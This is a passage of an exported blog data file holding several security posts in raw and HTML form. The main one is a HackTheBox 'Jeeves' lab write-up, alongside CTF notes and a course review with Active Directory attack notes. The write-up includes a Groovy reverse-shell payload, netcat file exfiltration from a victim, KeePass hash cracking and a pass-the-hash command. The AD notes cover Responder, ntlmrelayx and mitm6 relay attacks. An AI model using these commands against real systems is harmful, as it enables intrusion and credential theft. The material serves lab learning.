--user=jeeves/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 --system //10.10.10.63 cmd.ex\n \n we now have a root shell!\n ![](/assets/images/Jeeves/jeevesroot.PNG)\n\nadmin has hm.txt file redirecting to actual file\n![](/assets/images/Jeeves/jeeveshn.PNG)\n\n get-content .\\hm.txt -stream root.txt\nand we get root flag :)\n","source":"_posts/2021-12-18-Jeeves HackTheBox.md","raw":"---\nlayout: single\ntitle:  Jeeves-HackTheBox\ndate: 2021-12-18\nclasses: wide\nheader:\n  teaser: \ntags:\n  - ctf\n  - HackTheBox\n--- \n\n\nJeeves is in reference to a Jenkins server that we will eventually be exploiting. Super fun recap box!\n\n![](/assets/images/Jeeves/jeevessite1.PNG)\nStarting off by scanning ports.\n![](/assets/images/Jeeves/jeevesscan.PNG)\n\nSee there is at least one webserver. Fuzz directories, ran nikto etc. Nothing of real interest there.\nCheck out the second Jetty webserver spotted in the nmap scan. gobuster until we find askjeeves\t\n\n![](/assets/images/Jeeves/jeeves1finsihsed.PNG)\n\nStumble accross the scripting console\n![](/assets/images/Jeeves/jeevescli.PNG)\n\nDo research to find ways to exploit this\nexploit jenkins with groovy script \nhttps://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution\n![](/assets/images/Jeeves/jeevesscript.PNG)\n\n\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy\n\nString host=\"<LOCAL-IP>\";\nint port=1234;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n\n![](/assets/images/Jeeves/jeevesusershell.PNG)  \n  \nWe get a user shell as kohsuke. \nAfter a little bit of recon we come accross CEH.kdbx \n  \nThis file format appears to be a keepass password file. Before we attempt to see the password we have to download the file to our local machine. \n  \n![](/assets/images/Jeeves/jeeveskdbx.PNG)\n\n I achieved this by downloading a netcat executable from the user shell we are in from a python http server that we host.\n  \n\"powershell wget \"http://localip:8000/nc.exe\" -outfile nc.exe\"\nThe virtual machine cannot reach out to github to download the file from there\nThen \"nc -lnvp <port> > CEH.kdbx\" on your local machine and \"nc.exe <local-ip> <same-port> < \"CEH.kdbx\" on the victim machine\n\nWe need a password to open the kdbx file. Why dont we crack it? \nI used this article as guidance, the main points summarized are\n                                                                                               \nhttps://www.rubydevices.com.au/blog/how-to-hack-keepass \ndownload and use keepass2john on the kdbx file.\n\n./keepass2john CEH.kdbx > CEH.hash\nRemove name of keepass database from the new hashfile. \nuse hashcat to crack the file.\n\n./hashcat -m 13400 -a 0 -w 1 CEH.hash <wordlist-file> \n moonshine1 is the password to the keepass file\n  \n ![](/assets/images/Jeeves/jeeveskeepass1.png)\n \n ![](/assets/images/Jeeves/jeeveskeepass2.png)\n \n We find a hash in the keepass file under the title of Backup stuff\n From here I got stuck for a while. While researching I found the tool pth-winexe\n read the docs, run to get admin! \n  \n pth-winexe --user=jeeves/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 --system //10.10.10.63 cmd.ex\n \n we now have a root shell!\n ![](/assets/images/Jeeves/jeevesroot.PNG)\n\nadmin has hm.txt file redirecting to actual file\n![](/assets/images/Jeeves/jeeveshn.PNG)\n\n get-content .\\hm.txt -stream root.txt\nand we get root flag :)\n","slug":"2021-12-18-Jeeves HackTheBox","published":1,"updated":"2024-07-24T16:20:44.838Z","comments":1,"photos":[],"_id":"clz07c5jk0001m3cpbpujdav6","content":"<p>Jeeves is in reference to a Jenkins server that we will eventually be exploiting. Super fun recap box!</p>\n<p><img src=\"/assets/images/Jeeves/jeevessite1.PNG\"><br>Starting off by scanning ports.<br><img src=\"/assets/images/Jeeves/jeevesscan.PNG\"></p>\n<p>See there is at least one webserver. Fuzz directories, ran nikto etc. Nothing of real interest there.<br>Check out the second Jetty webserver spotted in the nmap scan. gobuster until we find askjeeves\t</p>\n<p><img src=\"/assets/images/Jeeves/jeeves1finsihsed.PNG\"></p>\n<p>Stumble accross the scripting console<br><img src=\"/assets/images/Jeeves/jeevescli.PNG\"></p>\n<p>Do research to find ways to exploit this<br>exploit jenkins with groovy script<br><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution\">https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution</a><br><img src=\"/assets/images/Jeeves/jeevesscript.PNG\"></p>\n<p><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy\">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy</a></p>\n<p>String host&#x3D;”<LOCAL-IP>“;<br>int port&#x3D;1234;<br>String cmd&#x3D;”cmd.exe”;<br>Process p&#x3D;new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s&#x3D;new Socket(host,port);InputStream pi&#x3D;p.getInputStream(),pe&#x3D;p.getErrorStream(), si&#x3D;s.getInputStream();OutputStream po&#x3D;p.getOutputStream(),so&#x3D;s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</p>\n<p><img src=\"/assets/images/Jeeves/jeevesusershell.PNG\">  </p>\n<p>We get a user shell as kohsuke.<br>After a little bit of recon we come accross CEH.kdbx </p>\n<p>This file format appears to be a keepass password file. Before we attempt to see the password we have to download the file to our local machine. </p>\n<p><img src=\"/assets/images/Jeeves/jeeveskdbx.PNG\"></p>\n<p> I achieved this by downloading a netcat executable from the user shell we are in from a python http server that we host.</p>\n<p>“powershell wget “<a href=\"http://localip:8000/nc.exe\">http://localip:8000/nc.exe</a>“ -outfile nc.exe”<br>The virtual machine cannot reach out to github to download the file from there<br>Then “nc -lnvp <port> &gt; CEH.kdbx” on your local machine and “nc.exe <local-ip> <same-port> &lt; “CEH.kdbx” on the victim machine</p>\n<p>We need a password to open the kdbx file. Why dont we crack it?<br>I used this article as guidance, the main points summarized are</p>\n<p><a href=\"https://www.rubydevices.com.au/blog/how-to-hack-keepass\">https://www.rubydevices.com.au/blog/how-to-hack-keepass</a><br>download and use keepass2john on the kdbx file.</p>\n<p>.&#x2F;keepass2john CEH.kdbx &gt; CEH.hash<br>Remove name of keepass database from the new hashfile.<br>use hashcat to crack the file.</p>\n<p>.&#x2F;hashcat -m 13400 -a 0 -w 1 CEH.hash <wordlist-file><br> moonshine1 is the password to the keepass file</p>\n<p> <img src=\"/assets/images/Jeeves/jeeveskeepass1.png\"></p>\n<p> <img src=\"/assets/images/Jeeves/jeeveskeepass2.png\"></p>\n<p> We find a hash in the keepass file under the title of Backup stuff<br> From here I got stuck for a while. While researching I found the tool pth-winexe<br> read the docs, run to get admin! </p>\n<p> pth-winexe –user&#x3D;jeeves&#x2F;administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 –system &#x2F;&#x2F;10.10.10.63 cmd.ex</p>\n<p> we now have a root shell!<br> <img src=\"/assets/images/Jeeves/jeevesroot.PNG\"></p>\n<p>admin has hm.txt file redirecting to actual file<br><img src=\"/assets/images/Jeeves/jeeveshn.PNG\"></p>\n<p> get-content .\\hm.txt -stream root.txt<br>and we get root flag :)</p>\n","excerpt":"","more":"<p>Jeeves is in reference to a Jenkins server that we will eventually be exploiting. Super fun recap box!</p>\n<p><img src=\"/assets/images/Jeeves/jeevessite1.PNG\"><br>Starting off by scanning ports.<br><img src=\"/assets/images/Jeeves/jeevesscan.PNG\"></p>\n<p>See there is at least one webserver. Fuzz directories, ran nikto etc. Nothing of real interest there.<br>Check out the second Jetty webserver spotted in the nmap scan. gobuster until we find askjeeves\t</p>\n<p><img src=\"/assets/images/Jeeves/jeeves1finsihsed.PNG\"></p>\n<p>Stumble accross the scripting console<br><img src=\"/assets/images/Jeeves/jeevescli.PNG\"></p>\n<p>Do research to find ways to exploit this<br>exploit jenkins with groovy script<br><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution\">https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution</a><br><img src=\"/assets/images/Jeeves/jeevesscript.PNG\"></p>\n<p><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy\">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy</a></p>\n<p>String host&#x3D;”<LOCAL-IP>“;<br>int port&#x3D;1234;<br>String cmd&#x3D;”cmd.exe”;<br>Process p&#x3D;new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s&#x3D;new Socket(host,port);InputStream pi&#x3D;p.getInputStream(),pe&#x3D;p.getErrorStream(), si&#x3D;s.getInputStream();OutputStream po&#x3D;p.getOutputStream(),so&#x3D;s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</p>\n<p><img src=\"/assets/images/Jeeves/jeevesusershell.PNG\">  </p>\n<p>We get a user shell as kohsuke.<br>After a little bit of recon we come accross CEH.kdbx </p>\n<p>This file format appears to be a keepass password file. Before we attempt to see the password we have to download the file to our local machine. </p>\n<p><img src=\"/assets/images/Jeeves/jeeveskdbx.PNG\"></p>\n<p> I achieved this by downloading a netcat executable from the user shell we are in from a python http server that we host.</p>\n<p>“powershell wget “<a href=\"http://localip:8000/nc.exe\">http://localip:8000/nc.exe</a>“ -outfile nc.exe”<br>The virtual machine cannot reach out to github to download the file from there<br>Then “nc -lnvp <port> &gt; CEH.kdbx” on your local machine and “nc.exe <local-ip> <same-port> &lt; “CEH.kdbx” on the victim machine</p>\n<p>We need a password to open the kdbx file. Why dont we crack it?<br>I used this article as guidance, the main points summarized are</p>\n<p><a href=\"https://www.rubydevices.com.au/blog/how-to-hack-keepass\">https://www.rubydevices.com.au/blog/how-to-hack-keepass</a><br>download and use keepass2john on the kdbx file.</p>\n<p>.&#x2F;keepass2john CEH.kdbx &gt; CEH.hash<br>Remove name of keepass database from the new hashfile.<br>use hashcat to crack the file.</p>\n<p>.&#x2F;hashcat -m 13400 -a 0 -w 1 CEH.hash <wordlist-file><br> moonshine1 is the password to the keepass file</p>\n<p> <img src=\"/assets/images/Jeeves/jeeveskeepass1.png\"></p>\n<p> <img src=\"/assets/images/Jeeves/jeeveskeepass2.png\"></p>\n<p> We find a hash in the keepass file under the title of Backup stuff<br> From here I got stuck for a while. While researching I found the tool pth-winexe<br> read the docs, run to get admin! </p>\n<p> pth-winexe –user&#x3D;jeeves&#x2F;administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 –system &#x2F;&#x2F;10.10.10.63 cmd.ex</p>\n<p> we now have a root shell!<br> <img src=\"/assets/images/Jeeves/jeevesroot.PNG\"></p>\n<p>admin has hm.txt file redirecting to actual file<br><img src=\"/assets/images/Jeeves/jeeveshn.PNG\"></p>\n<p> get-content .\\hm.txt -stream root.txt<br>and we get root flag :)</p>\n"},{"layout":"single","title":"Hacker101 CTF Private Program Invite","date":"2021-12-19T05:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n![](/assets/images/Hacker101.PNG)\n\n\nThe Hacker101 Capture the Flag challenges are great practice for learning web application security.\n\nIf paired with the accompanying course you will have relatively little issue getting invites.\n\nIt took me around an hour and a half to get a single invite to a private program. There are challenges from Beginner to Intermediate difficulty.\n\nhttps://www.hacker101.com/videos\n\nhttps://ctf.hacker101.com/\n\nIf paired with a PentesterLab subscription, The Web Application Hackers Handbook, running Damn Vulnerable Web Application and attacking. \nPlenty others exist but these are the best sources in my exerience (which isn't much :)). \n\n","source":"_posts/2021-12-19-Hacker101 CTF.md","raw":"---\nlayout: single\ntitle:  Hacker101 CTF Private Program Invite\ndate: 2021-12-19\nclasses: wide\nheader:\n  teaser: \ntags:\n  - ctf\n  - Web\n--- \n![](/assets/images/Hacker101.PNG)\n\n\nThe Hacker101 Capture the Flag challenges are great practice for learning web application security.\n\nIf paired with the accompanying course you will have relatively little issue getting invites.\n\nIt took me around an hour and a half to get a single invite to a private program. There are challenges from Beginner to Intermediate difficulty.\n\nhttps://www.hacker101.com/videos\n\nhttps://ctf.hacker101.com/\n\nIf paired with a PentesterLab subscription, The Web Application Hackers Handbook, running Damn Vulnerable Web Application and attacking. \nPlenty others exist but these are the best sources in my exerience (which isn't much :)). \n\n","slug":"2021-12-19-Hacker101 CTF","published":1,"updated":"2024-07-24T16:20:44.838Z","comments":1,"photos":[],"_id":"clz07c5jz0003m3cp10ygaosn","content":"<p><img src=\"/assets/images/Hacker101.PNG\"></p>\n<p>The Hacker101 Capture the Flag challenges are great practice for learning web application security.</p>\n<p>If paired with the accompanying course you will have relatively little issue getting invites.</p>\n<p>It took me around an hour and a half to get a single invite to a private program. There are challenges from Beginner to Intermediate difficulty.</p>\n<p><a href=\"https://www.hacker101.com/videos\">https://www.hacker101.com/videos</a></p>\n<p><a href=\"https://ctf.hacker101.com/\">https://ctf.hacker101.com/</a></p>\n<p>If paired with a PentesterLab subscription, The Web Application Hackers Handbook, running Damn Vulnerable Web Application and attacking.<br>Plenty others exist but these are the best sources in my exerience (which isn’t much :)). </p>\n","excerpt":"","more":"<p><img src=\"/assets/images/Hacker101.PNG\"></p>\n<p>The Hacker101 Capture the Flag challenges are great practice for learning web application security.</p>\n<p>If paired with the accompanying course you will have relatively little issue getting invites.</p>\n<p>It took me around an hour and a half to get a single invite to a private program. There are challenges from Beginner to Intermediate difficulty.</p>\n<p><a href=\"https://www.hacker101.com/videos\">https://www.hacker101.com/videos</a></p>\n<p><a href=\"https://ctf.hacker101.com/\">https://ctf.hacker101.com/</a></p>\n<p>If paired with a PentesterLab subscription, The Web Application Hackers Handbook, running Damn Vulnerable Web Application and attacking.<br>Plenty others exist but these are the best sources in my exerience (which isn’t much :)). </p>\n"},{"layout":"single","title":"Learning to Solve basic Crackme's with Pwnable.kr","date":"2021-12-08T05:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n\n\n\nThroughout the journey I will reference multiple sources and people to gain a better understanding of binary exploitation and reverse engineering at large.\n\nTo begin my journey I will go through\n\nhttps://research.checkpoint.com/wp-content/uploads/2020/03/pwnable_writeup.pdf\n\n-----------------------------------------------------------\n\nI attempted http://microcorruption.com/  but with my current knowledge I can't even begin to understand what's going on. I would have to continue on the SLAE course and work more with disassemblers to read the assembly instructions and work with their debugger.\n\nOnto pwnable.kr challenges, challenge 0x02 Bof, a buffer overflow challenge with the source code included to look at.\n\n![](/assets/images/learning-crackme/crackme.png)\n\nThey initialize key as a variable, initialize a buffer of 32 bits for \"overflow me\", prints that statement to console. \n\nThey then ask for inputs with gets \n\n(which is a dangerous for memory error if implemented incorrectly, it just seeks input without verifying how much data will fit in the buffer)\n\nWork in progress, continuing tomorrow\n\n","source":"_posts/2021-12-8-Learning to Solve basic Crackme's with Pwnable.kr.md","raw":"---\nlayout: single\ntitle:  Learning to Solve basic Crackme's with Pwnable.kr \ndate: 2021-12-8\nclasses: wide\nheader:\n  teaser: \ntags:\n  - pwn\n  - Crackme\n  - ctf\n--- \n\n\n\nThroughout the journey I will reference multiple sources and people to gain a better understanding of binary exploitation and reverse engineering at large.\n\nTo begin my journey I will go through\n\nhttps://research.checkpoint.com/wp-content/uploads/2020/03/pwnable_writeup.pdf\n\n-----------------------------------------------------------\n\nI attempted http://microcorruption.com/  but with my current knowledge I can't even begin to understand what's going on. I would have to continue on the SLAE course and work more with disassemblers to read the assembly instructions and work with their debugger.\n\nOnto pwnable.kr challenges, challenge 0x02 Bof, a buffer overflow challenge with the source code included to look at.\n\n![](/assets/images/learning-crackme/crackme.png)\n\nThey initialize key as a variable, initialize a buffer of 32 bits for \"overflow me\", prints that statement to console. \n\nThey then ask for inputs with gets \n\n(which is a dangerous for memory error if implemented incorrectly, it just seeks input without verifying how much data will fit in the buffer)\n\nWork in progress, continuing tomorrow\n\n","slug":"2021-12-8-Learning to Solve basic Crackme's with Pwnable.kr","published":1,"updated":"2024-07-24T16:20:44.834Z","comments":1,"photos":[],"_id":"clz07c5k20004m3cpbjzc0rj3","content":"<p>Throughout the journey I will reference multiple sources and people to gain a better understanding of binary exploitation and reverse engineering at large.</p>\n<p>To begin my journey I will go through</p>\n<p><a href=\"https://research.checkpoint.com/wp-content/uploads/2020/03/pwnable_writeup.pdf\">https://research.checkpoint.com/wp-content/uploads/2020/03/pwnable_writeup.pdf</a></p>\n<hr>\n<p>I attempted <a href=\"http://microcorruption.com/\">http://microcorruption.com/</a>  but with my current knowledge I can’t even begin to understand what’s going on. I would have to continue on the SLAE course and work more with disassemblers to read the assembly instructions and work with their debugger.</p>\n<p>Onto pwnable.kr challenges, challenge 0x02 Bof, a buffer overflow challenge with the source code included to look at.</p>\n<p><img src=\"/assets/images/learning-crackme/crackme.png\"></p>\n<p>They initialize key as a variable, initialize a buffer of 32 bits for “overflow me”, prints that statement to console. </p>\n<p>They then ask for inputs with gets </p>\n<p>(which is a dangerous for memory error if implemented incorrectly, it just seeks input without verifying how much data will fit in the buffer)</p>\n<p>Work in progress, continuing tomorrow</p>\n","excerpt":"","more":"<p>Throughout the journey I will reference multiple sources and people to gain a better understanding of binary exploitation and reverse engineering at large.</p>\n<p>To begin my journey I will go through</p>\n<p><a href=\"https://research.checkpoint.com/wp-content/uploads/2020/03/pwnable_writeup.pdf\">https://research.checkpoint.com/wp-content/uploads/2020/03/pwnable_writeup.pdf</a></p>\n<hr>\n<p>I attempted <a href=\"http://microcorruption.com/\">http://microcorruption.com/</a>  but with my current knowledge I can’t even begin to understand what’s going on. I would have to continue on the SLAE course and work more with disassemblers to read the assembly instructions and work with their debugger.</p>\n<p>Onto pwnable.kr challenges, challenge 0x02 Bof, a buffer overflow challenge with the source code included to look at.</p>\n<p><img src=\"/assets/images/learning-crackme/crackme.png\"></p>\n<p>They initialize key as a variable, initialize a buffer of 32 bits for “overflow me”, prints that statement to console. </p>\n<p>They then ask for inputs with gets </p>\n<p>(which is a dangerous for memory error if implemented incorrectly, it just seeks input without verifying how much data will fit in the buffer)</p>\n<p>Work in progress, continuing tomorrow</p>\n"},{"layout":"single","title":"TCM PEH Course Review+AD Notes","date":"2021-12-19T05:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n\n# TCM PEH (The Cyber Mentor Practical Ethical Hacking) Course Review!\n\nA little while ago I was gifted the PEH course by TCM from someone in his server!\nTL;DR The PEH course is a wonderful introduction to pentesting and I would reccomend it to learn the basics.\n\nThe course covers:\n\n![](/assets/images/TCMPEH.PNG)\n\nIt is frequently on discount and is worth every penny.\n\nWhile this information could be found in other places, Heath's style of teaching is comprehensive and easy to follow along with.\n\nHe walks through a couple of boxes from HacktheBox.eu which really help with getting that initial grasp on your own methodology.\n\nThe buffer overflow video made binary exploitation a bit more palatable than I was expecting.\n\n\nHere are some notes that I took from the Active Directory portion of the course. Not meant to be a polished guide for use by others :)\n\n---\n\nAttacking AD: Initial Attack vectors\n- Abuse native windows features to get access. \n\n- Netbios and LLMNR \n- Relay Attack \n- NTLM Relay\n- MS17-010, eternalblue still found surprisingly a lot on internal test\n- Kerberoasting, post comprimise\n- mitm6 \n\nTop Five ways i got domain admin on your intenrnal network before lunch \n\n\n----LLMNR Poisining  \nLink local multicast name resolution\nPreviously NBT-NT or netbios name service\nbasically DNS, that's what we use when DNS fails \n\n\nThis is a man in the middle attack, stealing the hash\nUsing Responder.py from Impacket\npython Responder.py -I tun0 -rdwv\nwe get an NTLM hash\ncrack with hashcat hashcat -m hashes.txt rockyou.txt  or hashcat -m hashfile wordlist\n\nrun it first thing in the morning or back from lunch because you need a lot of traffic to intercept\nWhen we respond to the service it responds back with a username and a NTLM hash\n\n\n----SMB Relay \n\ninstead of cracking hashes that we get with responder we can instead relay those \nhashes to specific machines and potentially gain access.\n\n\ncannot relay credential to the same machine\nsmb signing disabled\nreplayed user credentials must be on that machine\n \nopen Responder.conf file and turn off SMB and HTTP\nrun responder python Responder.py -I tun0 -rdwv\nsetup your relay ntlmrelayx.py -tf targets.txt -smb2support then wait for an event\nprofit \nnc ip 11000 afterwards for an smb shell\nDumping out the SAM files, they're like shadow in linux. Usernames and hashes for local users on the computer.\n\nSMB signing disabled by default on workstation accounts but by default enabled and required on domain controllers\nDiscovering hosts with SMB signing disabled. You can run nessus and it will tell you. \nNMAP built in script and github SMB signing check script\nNMAP - nmap --script=smb2-security-mode.nse -p445 IP/24\ncan attack even if it says message signing enable but not required\n\n----IPv6 Attacks\nanother form of relaying, a lot more reliable. Utilizing ipv6\nspoof dns for ipv6 addresses because usually no one is doing dns for ipv4\nyou don't have to be admin\n\n\nLearned about these a little bit previously from a presentation by QCS (Queen City Skiddies) member lpha3ch0.\nhttps://qcskiddies.com/?page_id=79\n\nmitm6 -d domain\nsetup a relay attack ntlmrelayx.py -6 -t ldaps:\\\\domaincontrollerip -wh wpadfile -l dir\ncan use SMB, LDAP, IMAP and MSSQL\n-6 is for ipv6 and -t is for target\nloot is in html files open with firefox\n\n---\n\nThanks for reading!\n","source":"_posts/2021-12-19-TCM PEH Course Review+AD Notes.md","raw":"---\nlayout: single\ntitle:  TCM PEH Course Review+AD Notes\ndate: 2021-12-19\nclasses: wide\nheader:\n  teaser: \ntags:\n  - Certification\n  - Review\n--- \n\n# TCM PEH (The Cyber Mentor Practical Ethical Hacking) Course Review!\n\nA little while ago I was gifted the PEH course by TCM from someone in his server!\nTL;DR The PEH course is a wonderful introduction to pentesting and I would reccomend it to learn the basics.\n\nThe course covers:\n\n![](/assets/images/TCMPEH.PNG)\n\nIt is frequently on discount and is worth every penny.\n\nWhile this information could be found in other places, Heath's style of teaching is comprehensive and easy to follow along with.\n\nHe walks through a couple of boxes from HacktheBox.eu which really help with getting that initial grasp on your own methodology.\n\nThe buffer overflow video made binary exploitation a bit more palatable than I was expecting.\n\n\nHere are some notes that I took from the Active Directory portion of the course. Not meant to be a polished guide for use by others :)\n\n---\n\nAttacking AD: Initial Attack vectors\n- Abuse native windows features to get access. \n\n- Netbios and LLMNR \n- Relay Attack \n- NTLM Relay\n- MS17-010, eternalblue still found surprisingly a lot on internal test\n- Kerberoasting, post comprimise\n- mitm6 \n\nTop Five ways i got domain admin on your intenrnal network before lunch \n\n\n----LLMNR Poisining  \nLink local multicast name resolution\nPreviously NBT-NT or netbios name service\nbasically DNS, that's what we use when DNS fails \n\n\nThis is a man in the middle attack, stealing the hash\nUsing Responder.py from Impacket\npython Responder.py -I tun0 -rdwv\nwe get an NTLM hash\ncrack with hashcat hashcat -m hashes.txt rockyou.txt  or hashcat -m hashfile wordlist\n\nrun it first thing in the morning or back from lunch because you need a lot of traffic to intercept\nWhen we respond to the service it responds back with a username and a NTLM hash\n\n\n----SMB Relay \n\ninstead of cracking hashes that we get with responder we can instead relay those \nhashes to specific machines and potentially gain access.\n\n\ncannot relay credential to the same machine\nsmb signing disabled\nreplayed user credentials must be on that machine\n \nopen Responder.conf file and turn off SMB and HTTP\nrun responder python Responder.py -I tun0 -rdwv\nsetup your relay ntlmrelayx.py -tf targets.txt -smb2support then wait for an event\nprofit \nnc ip 11000 afterwards for an smb shell\nDumping out the SAM files, they're like shadow in linux. Usernames and hashes for local users on the computer.\n\nSMB signing disabled by default on workstation accounts but by default enabled and required on domain controllers\nDiscovering hosts with SMB signing disabled. You can run nessus and it will tell you. \nNMAP built in script and github SMB signing check script\nNMAP - nmap --script=smb2-security-mode.nse -p445 IP/24\ncan attack even if it says message signing enable but not required\n\n----IPv6 Attacks\nanother form of relaying, a lot more reliable. Utilizing ipv6\nspoof dns for ipv6 addresses because usually no one is doing dns for ipv4\nyou don't have to be admin\n\n\nLearned about these a little bit previously from a presentation by QCS (Queen City Skiddies) member lpha3ch0.\nhttps://qcskiddies.com/?page_id=79\n\nmitm6 -d domain\nsetup a relay attack ntlmrelayx.py -6 -t ldaps:\\\\domaincontrollerip -wh wpadfile -l dir\ncan use SMB, LDAP, IMAP and MSSQL\n-6 is for ipv6 and -t is for target\nloot is in html files open with firefox\n\n---\n\nThanks for reading!\n","slug":"2021-12-19-TCM PEH Course Review+AD Notes","published":1,"updated":"2024-07-24T16:20:44.838Z","comments":1,"photos":[],"_id":"clz07c5k50005m3cp3n9xbwfk","content":"<h1 id=\"TCM-PEH-The-Cyber-Mentor-Practical-Ethical-Hacking-Course-Review\"><a href=\"#TCM-PEH-The-Cyber-Mentor-Practical-Ethical-Hacking-Course-Review\" class=\"headerlink\" title=\"TCM PEH (The Cyber Mentor Practical Ethical Hacking) Course Review!\"></a>TCM PEH (The Cyber Mentor Practical Ethical Hacking) Course Review!</h1><p>A little while ago I was gifted the PEH course by TCM from someone in his server!<br>TL;DR The PEH course is a wonderful introduction to pentesting and I would reccomend it to learn the basics.</p>\n<p>The course covers:</p>\n<p><img src=\"/assets/images/TCMPEH.PNG\"></p>\n<p>It is frequently on discount and is worth every penny.</p>\n<p>While this information could be found in other places, Heath’s style of teaching is comprehensive and easy to follow along with.</p>\n<p>He walks through a couple of boxes from HacktheBox.eu which really help with getting that initial grasp on your own methodology.</p>\n<p>The buffer overflow video made binary exploitation a bit more palatable than I was expecting.</p>\n<p>Here are some notes that I took from the Active Directory portion of the course. Not meant to be a polished guide for use by others :)</p>\n<hr>\n<p>Attacking AD: Initial Attack vectors</p>\n<ul>\n<li><p>Abuse native windows features to get access. </p>\n</li>\n<li><p>Netbios and LLMNR </p>\n</li>\n<li><p>Relay Attack </p>\n</li>\n<li><p>NTLM Relay</p>\n</li>\n<li><p>MS17-010, eternalblue still found surprisingly a lot on internal test</p>\n</li>\n<li><p>Kerberoasting, post comprimise</p>\n</li>\n<li><p>mitm6</p>\n</li>\n</ul>\n<p>Top Five ways i got domain admin on your intenrnal network before lunch </p>\n<p>—-LLMNR Poisining<br>Link local multicast name resolution<br>Previously NBT-NT or netbios name service<br>basically DNS, that’s what we use when DNS fails </p>\n<p>This is a man in the middle attack, stealing the hash<br>Using Responder.py from Impacket<br>python Responder.py -I tun0 -rdwv<br>we get an NTLM hash<br>crack with hashcat hashcat -m hashes.txt rockyou.txt  or hashcat -m hashfile wordlist</p>\n<p>run it first thing in the morning or back from lunch because you need a lot of traffic to intercept<br>When we respond to the service it responds back with a username and a NTLM hash</p>\n<p>—-SMB Relay </p>\n<p>instead of cracking hashes that we get with responder we can instead relay those<br>hashes to specific machines and potentially gain access.</p>\n<p>cannot relay credential to the same machine<br>smb signing disabled<br>replayed user credentials must be on that machine</p>\n<p>open Responder.conf file and turn off SMB and HTTP<br>run responder python Responder.py -I tun0 -rdwv<br>setup your relay ntlmrelayx.py -tf targets.txt -smb2support then wait for an event<br>profit<br>nc ip 11000 afterwards for an smb shell<br>Dumping out the SAM files, they’re like shadow in linux. Usernames and hashes for local users on the computer.</p>\n<p>SMB signing disabled by default on workstation accounts but by default enabled and required on domain controllers<br>Discovering hosts with SMB signing disabled. You can run nessus and it will tell you.<br>NMAP built in script and github SMB signing check script<br>NMAP - nmap –script&#x3D;smb2-security-mode.nse -p445 IP&#x2F;24<br>can attack even if it says message signing enable but not required</p>\n<p>—-IPv6 Attacks<br>another form of relaying, a lot more reliable. Utilizing ipv6<br>spoof dns for ipv6 addresses because usually no one is doing dns for ipv4<br>you don’t have to be admin</p>\n<p>Learned about these a little bit previously from a presentation by QCS (Queen City Skiddies) member lpha3ch0.<br><a href=\"https://qcskiddies.com/?page_id=79\">https://qcskiddies.com/?page_id=79</a></p>\n<p>mitm6 -d domain<br>setup a relay attack ntlmrelayx.py -6 -t ldaps:\\domaincontrollerip -wh wpadfile -l dir<br>can use SMB, LDAP, IMAP and MSSQL<br>-6 is for ipv6 and -t is for target<br>loot is in html files open with firefox</p>\n<hr>\n<p>Thanks for reading!</p>\n","excerpt":"","more":"<h1 id=\"TCM-PEH-The-Cyber-Mentor-Practical-Ethical-Hacking-Course-Review\"><a href=\"#TCM-PEH-The-Cyber-Mentor-Practical-Ethical-Hacking-Course-Review\" class=\"headerlink\" title=\"TCM PEH (The Cyber Mentor Practical Ethical Hacking) Course Review!\"></a>TCM PEH (The Cyber Mentor Practical Ethical Hacking) Course Review!</h1><p>A little while ago I was gifted the PEH course by TCM from someone in his server!<br>TL;DR The PEH course is a wonderful introduction to pentesting and I would reccomend it to learn the basics.</p>\n<p>The course covers:</p>\n<p><img src=\"/assets/images/TCMPEH.PNG\"></p>\n<p>It is frequently on discount and is worth every penny.</p>\n<p>While this information could be found in other places, Heath’s style of teaching is comprehensive and easy to follow along with.</p>\n<p>He walks through a couple of boxes from HacktheBox.eu which really help with getting that initial grasp on your own methodology.</p>\n<p>The buffer overflow video made binary exploitation a bit more palatable than I was expecting.</p>\n<p>Here are some notes that I took from the Active Directory portion of the course. Not meant to be a polished guide for use by others :)</p>\n<hr>\n<p>Attacking AD: Initial Attack vectors</p>\n<ul>\n<li><p>Abuse native windows features to get access. 